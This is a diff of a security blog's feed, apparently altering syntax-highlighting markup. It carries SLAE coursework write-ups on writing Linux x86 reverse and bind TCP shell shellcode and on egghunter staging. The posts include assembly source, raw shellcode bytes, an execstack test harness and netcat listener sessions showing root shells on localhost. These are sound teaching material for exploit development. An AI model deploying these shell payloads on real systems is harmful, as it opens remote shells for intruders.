 &lt;span class="cp"&gt;#define PORT 1234&lt;/span&gt;
@@ -1477,24 +1477,24 @@ This blog post was created to fulfill the requirements of the &lt;a href="http:/
 
 
 &lt;p&gt;After compilation we can use Netcat to test that the code is working:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Start Netcat in one console window&lt;/span&gt;
-nc -lvp 1234
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Start Netcat in one console window&lt;/span&gt;
+nc -lvp &lt;span class="m"&gt;1234&lt;/span&gt;
 
-&lt;span class="c"&gt;# Compile and start the C reverse shell implementation&lt;/span&gt;
+&lt;span class="c1"&gt;# Compile and start the C reverse shell implementation&lt;/span&gt;
 gcc -o revshell revshell.c &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./revshell
 
-&lt;span class="c"&gt;# Back in the console with Netcat you should get a connection. Test if it works:&lt;/span&gt;
+&lt;span class="c1"&gt;# Back in the console with Netcat you should get a connection. Test if it works:&lt;/span&gt;
 listening on &lt;span class="o"&gt;[&lt;/span&gt;any&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;1234&lt;/span&gt; ...
-connect to &lt;span class="o"&gt;[&lt;/span&gt;127.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; from localhost &lt;span class="o"&gt;[&lt;/span&gt;127.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; 35476
+connect to &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; from localhost &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;35476&lt;/span&gt;
 id
-&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
 ^C
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;One thing to remember from the previous post on bind TCP shell is that &lt;code&gt;socket&lt;/code&gt; and &lt;code&gt;connect&lt;/code&gt; functions are plugged into the &lt;code&gt;socketcall&lt;/code&gt; system call. And basically we can largely reuse the bind shell source code making relevant changes to it. The changes include removing blocks for listen and accept functions, transforming bind function block to connect, and replacing the address from 0.0.0.0 to 127.1.1.1. The 127.1.1.1 is equivalent to 127.0.0.1 localhost address, with an advantage of eliminating zeroes. Some people think that only 127.0.0.1 address refers to the localhost, while in truth all valid IPv4 address beginning with 127 are synonyms and refer to the same localhost address. &lt;/p&gt;
 &lt;p&gt;After applying the aforementioned changes, here is what I got (follow the comments if it is not clear what's going on):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
     &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -1559,14 +1559,14 @@ id
 
 
 &lt;p&gt;Now let's build the binary and extract and thest the shellcode to make sure that we have not missed anything. &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Build a binary and extract the shellcode &lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Build a binary and extract the shellcode &lt;/span&gt;
 nasm -f elf revshell.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o revshell revshell.o
 scdump revshell
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output of the above command (formatted to fit the screen):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;Length:  78
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Length:  78
 Payload: &amp;quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80&amp;quot;
 &amp;quot;\x92\xb0\x66\x5b\x5e\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x66\x53\x6a\x10\x51&amp;quot;
 &amp;quot;\x52\x89\xe1\x43\xcd\x80\x87\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9&amp;quot;
@@ -1577,21 +1577,21 @@ Payload: &amp;quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\
 
 &lt;div class="divider"&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Paste the shellcode into the scframe.c and compile it:&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Paste the shellcode into the scframe.c and compile it:&lt;/span&gt;
 gcc -fno-stack-protector -z execstack -o scframe scframe.c
 
-&lt;span class="c"&gt;# In another console window start Netcat listener&lt;/span&gt;
-nc -lvp 1234
+&lt;span class="c1"&gt;# In another console window start Netcat listener&lt;/span&gt;
+nc -lvp &lt;span class="m"&gt;1234&lt;/span&gt;
 
-&lt;span class="c"&gt;# Back in the window where you compiled the scframe launch it&lt;/span&gt;
+&lt;span class="c1"&gt;# Back in the window where you compiled the scframe launch it&lt;/span&gt;
 ./scframe
 
-&lt;span class="c"&gt;# Check the Netcat listener to see if you got a reverse shell connection&lt;/span&gt;
-nc -lvp 1234
+&lt;span class="c1"&gt;# Check the Netcat listener to see if you got a reverse shell connection&lt;/span&gt;
+nc -lvp &lt;span class="m"&gt;1234&lt;/span&gt;
 listening on &lt;span class="o"&gt;[&lt;/span&gt;any&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;1234&lt;/span&gt; ...
-connect to &lt;span class="o"&gt;[&lt;/span&gt;127.1.1.1&lt;span class="o"&gt;]&lt;/span&gt; from localhost &lt;span class="o"&gt;[&lt;/span&gt;127.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; 33275
+connect to &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.1.1.1&lt;span class="o"&gt;]&lt;/span&gt; from localhost &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;33275&lt;/span&gt;
 id
-&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
 ^C
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -1607,11 +1607,11 @@ id
 
 &lt;p&gt;&lt;hr&gt;
 This blog post was created to fulfill the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
-&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Building TCP bind shell shellcode (SLAE, Assignment #1)</title><link href="http://www.wryway.com/blog/building-tcp-bind-shell-shellcode/" rel="alternate"></link><updated>2015-10-05T18:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-05:blog/building-tcp-bind-shell-shellcode/</id><summary type="html">&lt;p&gt;If you haven't written a bind TCP shell in Assembly before, then it is better to start with a higher-level language working prototype and then translate it to Assembly. The obvious choice of the higher level language for Linux is C. Here is a working TCP bind shell code in C. I tried to remove as much unneeded code as possible. Generally it may be a bad idea, but when writing shellcode, this is exactly what you want - a working thing with as few parts as possible.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;strings.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</content><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Building TCP bind shell shellcode (SLAE, Assignment #1)</title><link href="http://www.wryway.com/blog/building-tcp-bind-shell-shellcode/" rel="alternate"></link><published>2015-10-05T18:00:00-04:00</published><updated>2015-10-05T18:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-05:/blog/building-tcp-bind-shell-shellcode/</id><summary type="html">&lt;p&gt;Demonstation of bind TCP shell shellcode creation&lt;/p&gt;</summary><content type="html">&lt;p&gt;If you haven't written a bind TCP shell in Assembly before, then it is better to start with a higher-level language working prototype and then translate it to Assembly. The obvious choice of the higher level language for Linux is C. Here is a working TCP bind shell code in C. I tried to remove as much unneeded code as possible. Generally it may be a bad idea, but when writing shellcode, this is exactly what you want - a working thing with as few parts as possible.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;strings.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 
 &lt;span class="cp"&gt;#define PORT 1234&lt;/span&gt;
 
@@ -1647,13 +1647,13 @@ This blog post was created to fulfill the requirements of the &lt;a href="http:/
 
 
 &lt;p&gt;After we compile and start it, we should make sure that the program is working:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Build and start the program&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Build and start the program&lt;/span&gt;
 gcc bindshell.c -o bindshell &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./bindshell
 
-&lt;span class="c"&gt;# Connect from another console and execute some commands making sure you got the shell&lt;/span&gt;
-nc localhost 1234
+&lt;span class="c1"&gt;# Connect from another console and execute some commands making sure you got the shell&lt;/span&gt;
+nc localhost &lt;span class="m"&gt;1234&lt;/span&gt;
 id
-&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
 ^C
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -1661,7 +1661,7 @@ id
 &lt;p&gt;Now, to get a compact shellcode we first need to translate the above C code into Assembly.&lt;/p&gt;
 &lt;p&gt;One nitty gritty detail you must be aware of is that four socket-related functions that were used in the C program actually use the same kernel entry point - &lt;code&gt;socketcall&lt;/code&gt;. The manual page for this syscall (&lt;code&gt;man 2 socketcall&lt;/code&gt;) says that only standard library implementers and kernel hackers need to know about it. It also says that this implementation is x86 platform specific and that on x86-64 and ARM there is no &lt;code&gt;socketcall&lt;/code&gt; system call; instead &lt;code&gt;socket&lt;/code&gt;, &lt;code&gt;accept&lt;/code&gt;, &lt;code&gt;bind&lt;/code&gt;, and all other socket functions are implemented as separate system calls.&lt;/p&gt;
 &lt;p&gt;Here is the Assembly version of the TCP bind shell with my extensive comments:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
     &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -1746,13 +1746,13 @@ id
 
 
 &lt;p&gt;After building a binary from the above source code we extract the shellcode and test it in the C program:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf bindshell.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o bindshell bindshell.o
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nasm -f elf bindshell.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o bindshell bindshell.o
 scdump bindshell
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output (formatted to fit on the screen):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;Length:  95
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Length:  95
 Payload: &amp;quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80&amp;quot;
 &amp;quot;\x97\x31\xc0\xb0\x66\x5b\x5e\x52\x66\x68\x04\xd2\x66\x53\x6a\x10\x51\x57\x89&amp;quot;
 &amp;quot;\xe1\xcd\x80\x31\xff\x5a\x57\x52\xb3\x04\x89\xe1\xb0\x66\xcd\x80\x57\x57\x52&amp;quot;
@@ -1763,8 +1763,8 @@ Payload: &amp;quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\
 
 
 &lt;p&gt;That's it. We have a working shellcode that initiates listening on predetermined port and serves a &lt;code&gt;/bin/sh&lt;/code&gt; shell to anyone connecting to that port. To make sure the shellcode works as intended, let's run it from inside of our C shellcode-framing program:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 
 &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 
 &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\x31&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
@@ -1784,16 +1784,16 @@ Payload: &amp;quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\
 
 
 &lt;p&gt;After the build and successful test we can perform the winner dance =).&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# In one console window&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# In one console window&lt;/span&gt;
 gcc -fno-stack-protector -z execstack -o scframe scframe.c
 ./scframe
 
-&lt;span class="c"&gt;# In the second console window&lt;/span&gt;
-nc localhost 1234
+&lt;span class="c1"&gt;# In the second console window&lt;/span&gt;
+nc localhost &lt;span class="m"&gt;1234&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;img alt="Bind TCP shell shellcode successful test" src="http://www.wryway.com/blog/building-tcp-bind-shell-shellcode/tcp-bind-shellcode-successful-test.png" title="Bind TCP shell shellcode successful test" /&gt;
+&lt;p&gt;&lt;img alt="Bind TCP shell shellcode successful test" src="http://www.wryway.com/blog/building-tcp-bind-shell-shellcode/tcp-bind-shellcode-successful-test.png" title="Bind TCP shell shellcode successful test"&gt;
 &lt;div class="img-caption"&gt;Bind TCP shell shellcode successful test&lt;/div&gt;&lt;/p&gt;
 &lt;div class="divider"&gt;&lt;/div&gt;
 
@@ -1805,7 +1805,7 @@ nc localhost 1234
 
 &lt;p&gt;&lt;hr&gt;
 This blog post was created to fulfill the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
-&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Staging payload using Egghunter technique (SLAE, Assignment #3)</title><link href="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/" rel="alternate"></link><updated>2015-10-04T19:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-04:blog/egghunter-technqiue-for-exploit-development/</id><summary type="html">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</content><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Staging payload using Egghunter technique (SLAE, Assignment #3)</title><link href="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/" rel="alternate"></link><published>2015-10-04T19:00:00-04:00</published><updated>2015-10-04T19:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-04:/blog/egghunter-technqiue-for-exploit-development/</id><summary type="html">&lt;p&gt;Understanding the Egghunter technique&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;This post is dedicated to the 3rd assignment of the &lt;a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SLAE&lt;/a&gt; certification exam. I prioritized this assignment because it was the only one that touched upon the subject not covered in the course.&lt;/p&gt;
 &lt;p&gt;The most often cited paper on &lt;em&gt;egghunter&lt;/em&gt; technique to date is &lt;a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf"&gt;Matt Miller's (aka skape) "Safely Searching Process Virtual Address Space"&lt;/a&gt;. To not deviate from the established tradition I will use that paper as the main reference too.&lt;/p&gt;
 &lt;p&gt;The whole technique is about staging exploitation in two steps in cases when you have insufficient space to fit an entire payload in the place where you have gained execution control. It works similar to staged Metasploit payloads: the first payload (stager) exploits vulnerability, takes control of the execution and downloads the second part (stage) - the fully-fledged and feature-reach payload (e.g. Meterpreter). In case of the egghunter, the egg-searching code is a stager that is used to find a unique marker, the egg, and pass execution to the stage, the main payload, following the egg.&lt;/p&gt;
@@ -1816,7 +1816,7 @@ This blog post was created to fulfill the requirements of the &lt;a href="http:/
 &lt;p&gt;To satisfy the requirement of executable egg pattern, instructions that don't change the logic of the execution flow are usually used. Vivek Ramachandran, the SLAE course instructor, calls them &lt;em&gt;nop-equivalents&lt;/em&gt;. For example, the following 1-byte instructions can be mixed to create an executable egg pattern: &lt;code&gt;nop&lt;/code&gt;, &lt;code&gt;push/pop r32&lt;/code&gt;, &lt;code&gt;inc/dec r32&lt;/code&gt;, &lt;code&gt;pushad/popad&lt;/code&gt;, &lt;code&gt;pushfd&lt;/code&gt;, &lt;code&gt;push/pop cs/ds/ss/es&lt;/code&gt;, &lt;code&gt;xchg eax&lt;/code&gt;, &lt;code&gt;r32&lt;/code&gt;, etc.&lt;/p&gt;
 &lt;h1&gt;Analyzing egghunter source code&lt;/h1&gt;
 &lt;p&gt;First we will create a simple shellcode to work with. The shellcode launches the /bin/sh shell using execve system call. Follows the source code and the command used to build the binary:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
     &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -1837,20 +1837,20 @@ This blog post was created to fulfill the requirements of the &lt;a href="http:/
 
 &lt;div class="divider"&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf stacksh.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld stacksh.o -o stacksh
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nasm -f elf stacksh.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld stacksh.o -o stacksh
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;img alt="Making sure the payload works" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/making-sure-payload-works.png" title="Making sure the payload works" /&gt;
+&lt;p&gt;&lt;img alt="Making sure the payload works" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/making-sure-payload-works.png" title="Making sure the payload works"&gt;
 &lt;div class="img-caption"&gt;Making sure the payload works&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;In our next step we extract the shellcode string from the code section of the binary using &lt;a href="https://github.com/reider-roque/reed/tree/master/tools"&gt;scdump&lt;/a&gt; helper script I created while going through the SLAE course:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Extracting shellcode" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/extracting-shellcode.png" title="Extracting shellcode" /&gt;
+&lt;p&gt;&lt;img alt="Extracting shellcode" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/extracting-shellcode.png" title="Extracting shellcode"&gt;
 &lt;div class="img-caption"&gt;Extracting shellcode&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;The extracted shellcode string:
 &lt;code&gt;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Next, I will use the second Linux egghunter shellcode found in the aforementioned paper, fix it, explain how it works and make some modifications to reduce its size. &lt;/p&gt;
 &lt;p&gt;Here is the initial egghunter source with my comments:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;_start:&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;_start:&lt;/span&gt;
     &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;        &lt;span class="c1"&gt;; Begin from the lowest memory address, which is 0&lt;/span&gt;
 &lt;span class="nl"&gt;.nextpage:&lt;/span&gt;
     &lt;span class="nf"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xfff&lt;/span&gt;        &lt;span class="c1"&gt;; This and the next instruction combined add 0x1000 (4096)&lt;/span&gt;
@@ -1877,33 +1877,33 @@ This blog post was created to fulfill the requirements of the &lt;a href="http:/
 
 &lt;p&gt;The egghunter searches for an 8 byte doubled-egg - &lt;code&gt;\x90\x50\x90\x50\x90\x50\x90\x50&lt;/code&gt;. That's why it checks for matching dword &lt;code&gt;0x50905090&lt;/code&gt; two times. &lt;/p&gt;
 &lt;p&gt;The following instruction sequence&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xfff&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xfff&lt;/span&gt;
 &lt;span class="nf"&gt;inc&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;is equivalent to&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x1000&lt;/span&gt;
